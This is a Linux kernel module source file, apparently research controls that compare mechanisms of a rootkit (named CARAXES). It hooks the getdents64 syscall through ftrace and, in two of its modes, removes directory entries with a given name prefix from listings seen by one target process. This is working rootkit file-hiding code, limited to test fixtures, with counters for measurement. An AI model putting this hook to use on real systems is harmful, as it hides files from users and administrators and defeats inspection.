/*
 * D8 getdents64 matched controls.
 *
 * KICBA_D8_MODE:
 *   0 = ftrace syscall hook only
 *   1 = copy, parse, and match records but preserve the buffer
 *   2 = suppress matching attack-fixture records
 *   3 = suppress matching authorized-policy records
 *
 * The directory-buffer transformation is implemented separately from the
 * CARAXES callback code.  The generic ftrace plumbing is shared explicitly so
 * that the comparison changes the suppression mechanism, not the attachment
 * framework.
 */

#include <linux/atomic.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/vmalloc.h>

#include "../d7_controls_r2/ftrace_helper.h"

#if !defined(KICBA_D8_MODE) || KICBA_D8_MODE < 0 || KICBA_D8_MODE > 3
#error "KICBA_D8_MODE must be 0..3"
#endif

MODULE_LICENSE("GPL");
#if KICBA_D8_MODE == 0
MODULE_DESCRIPTION("KICBA D8 getdents64 pass-through control");
#elif KICBA_D8_MODE == 1
MODULE_DESCRIPTION("KICBA D8 getdents64 active-logic control");
#elif KICBA_D8_MODE == 2
MODULE_DESCRIPTION("KICBA D8 getdents64 hiding treatment");
#else
MODULE_DESCRIPTION("KICBA D8 authorized directory policy control");
#endif

static char *target_comm = "d8_enum_probe";
module_param(target_comm, charp, 0444);
MODULE_PARM_DESC(target_comm, "Only transform getdents64 calls from this comm");

#if KICBA_D8_MODE == 3
static char *match_prefix = "d8_policy_";
static bool policy_authorized;
module_param(policy_authorized, bool, 0400);
MODULE_PARM_DESC(policy_authorized, "Required explicit authorization gate");
#else
static char *match_prefix = "d8_hidden_";
#endif
module_param(match_prefix, charp, 0444);
MODULE_PARM_DESC(match_prefix, "Directory-entry prefix inspected by this module");

static atomic64_t target_syscalls = ATOMIC64_INIT(0);
static atomic64_t records_seen = ATOMIC64_INIT(0);
static atomic64_t filter_matches = ATOMIC64_INIT(0);
static atomic64_t records_removed = ATOMIC64_INIT(0);
static atomic64_t bytes_removed = ATOMIC64_INIT(0);
static atomic64_t parse_errors = ATOMIC64_INIT(0);

static int d8_param_get_atomic64(char *buffer, const struct kernel_param *kp)
{
	const atomic64_t *value = kp->arg;

	return sysfs_emit(buffer, "%lld\n", (long long)atomic64_read(value));
}

static const struct kernel_param_ops d8_atomic64_ro_ops = {
	.get = d8_param_get_atomic64,
};

#define D8_COUNTER(_name) \
	module_param_cb(_name, &d8_atomic64_ro_ops, &_name, 0444)

D8_COUNTER(target_syscalls);
D8_COUNTER(records_seen);
D8_COUNTER(filter_matches);
D8_COUNTER(records_removed);
D8_COUNTER(bytes_removed);
D8_COUNTER(parse_errors);

static bool d8_is_target_task(void)
{
	return strcmp(current->comm, target_comm) == 0;
}

static bool d8_name_matches(const char *name)
{
	size_t prefix_len = strlen(match_prefix);

	return prefix_len > 0 && strncmp(name, match_prefix, prefix_len) == 0;
}

static long (*d8_orig_getdents64)(const struct pt_regs *regs);

static asmlinkage long d8_hook_getdents64(const struct pt_regs *regs)
{
	struct linux_dirent64 __user *user_dirents;
	struct linux_dirent64 *entry;
	char *buffer;
	unsigned long input_offset = 0;
	unsigned long output_offset = 0;
	long result;

	result = d8_orig_getdents64(regs);
	if (result <= 0 || !d8_is_target_task())
		return result;

	atomic64_inc(&target_syscalls);
#if KICBA_D8_MODE == 0
	return result;
#endif

	user_dirents = (struct linux_dirent64 __user *)regs->si;
	buffer = kvmalloc(result, GFP_KERNEL);
	if (!buffer)
		return result;
	if (copy_from_user(buffer, user_dirents, result)) {
		atomic64_inc(&parse_errors);
		kvfree(buffer);
		return result;
	}

	while (input_offset < result) {
		size_t header = offsetof(struct linux_dirent64, d_name);
		size_t name_room;
		size_t name_len;
		bool matched;

		entry = (struct linux_dirent64 *)(buffer + input_offset);
		if (entry->d_reclen < header + 1 ||
		    input_offset + entry->d_reclen > result) {
			atomic64_inc(&parse_errors);
			kvfree(buffer);
			return result;
		}
		name_room = entry->d_reclen - header;
		name_len = strnlen(entry->d_name, name_room);
		if (name_len == name_room) {
			atomic64_inc(&parse_errors);
			kvfree(buffer);
			return result;
		}

		atomic64_inc(&records_seen);
		matched = d8_name_matches(entry->d_name);
		if (matched)
			atomic64_inc(&filter_matches);

#if KICBA_D8_MODE == 2 || KICBA_D8_MODE == 3
		if (matched) {
			atomic64_inc(&records_removed);
			atomic64_add(entry->d_reclen, &bytes_removed);
			input_offset += entry->d_reclen;
			continue;
		}
#endif

		if (output_offset != input_offset)
			memmove(buffer + output_offset, entry, entry->d_reclen);
		output_offset += entry->d_reclen;
		input_offset += entry->d_reclen;
	}

#if KICBA_D8_MODE == 2 || KICBA_D8_MODE == 3
	if (output_offset != result &&
	    copy_to_user(user_dirents, buffer, output_offset)) {
		atomic64_inc(&parse_errors);
		kvfree(buffer);
		return result;
	}
	result = output_offset;
#endif

	kvfree(buffer);
	return result;
}

static struct ftrace_hook d8_hook =
	HOOK("sys_getdents64", d8_hook_getdents64, &d8_orig_getdents64);

static int __init d8_init(void)
{
#if KICBA_D8_MODE == 3
	if (!policy_authorized)
		return -EPERM;
#endif
	if (!match_prefix || !*match_prefix || !target_comm || !*target_comm)
		return -EINVAL;
	return fh_install_hook(&d8_hook);
}

static void __exit d8_exit(void)
{
	fh_remove_hook(&d8_hook);
}

module_init(d8_init);
module_exit(d8_exit);
